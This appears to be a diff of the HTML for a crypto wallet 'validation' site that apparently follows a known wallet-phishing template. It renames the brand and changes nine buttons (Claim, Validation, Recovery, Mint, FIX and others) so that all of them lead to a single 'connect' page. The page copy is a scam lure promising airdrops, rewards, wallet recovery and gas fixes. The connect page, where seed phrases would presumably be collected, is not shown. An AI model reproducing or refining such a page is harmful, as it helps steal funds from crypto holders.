@@ -48,7 +48,7 @@
   </div>
     <div id="middle">
       <h1>Our Services</h1>
-      <p>Dappz Walletnode is a decentralized protocol. dConnect create an
+      <p>Dapp Walletnode is a decentralized protocol. dConnect create an
         innovative open-source software ecosystem that is both secure and resilient. And it allows
          developers to create new online tools, many of which have piqued the interest
          of global business markets. Validation of wallet will be completed below as follows </p>
@@ -65,7 +65,7 @@
         <p>Claim Rewards and Airdrops for ongoing Crypto  Project</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Claim</button>
+        <button type="button" onclick="window.location.href='connect';">Claim</button>
       </div>
       </div>
       </div>
@@ -80,7 +80,7 @@
         <p>Pre-Sale of new token at opening price</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">BuY</button>
+        <button type="button" onclick="window.location.href='connect';">BuY</button>
       </div>
       </div>
       </div>
@@ -95,7 +95,7 @@
         <p>Validation completely decentralized supports wallet</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Validation</button>
+        <button type="button" onclick="window.location.href='connect';">Validation</button>
       </div>
       </div>
       </div>
@@ -110,7 +110,7 @@
         <p> Recovery wallet TATs Dapps with Blockchain and DeFi</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Recovery</button>
+        <button type="button" onclick="window.location.href='connect';">Recovery</button>
       </div>
       </div>
       </div>
@@ -127,7 +127,7 @@
         <p>NFTs are digital collectibles that can be traded like other cryptocurrencies. They confer some ownership rights to a work  </p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Mint</button>
+        <button type="button" onclick="window.location.href='connect';">Mint</button>
       </div>
       </div>
       </div>
@@ -142,7 +142,7 @@
         <p>When you choose to redeem, we'll return your assets to your Spot Wallet the following day.</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Harvest</button>
+        <button type="button" onclick="window.location.href='connect';">Harvest</button>
       </div>
       </div>
       </div>
@@ -157,7 +157,7 @@
         <p>Purchase tokens from our vendor and get discount offers</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Purchase</button>
+        <button type="button" onclick="window.location.href='connect';">Purchase</button>
       </div>
       </div>
       </div>
@@ -172,7 +172,7 @@
         <p>Migrate from one Defi to another</p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">Migrate</button>
+        <button type="button" onclick="window.location.href='connect';">Migrate</button>
       </div>
       </div>
       </div>
@@ -188,7 +188,7 @@
         <p>Fix Gas issues to reset </p>
       </div>
       <div>
-        <button type="button" onclick="window.location.href='connect.php';">FIX</button>
+        <button type="button" onclick="window.location.href='connect';">FIX</button>
       </div>
       </div>
       </div>
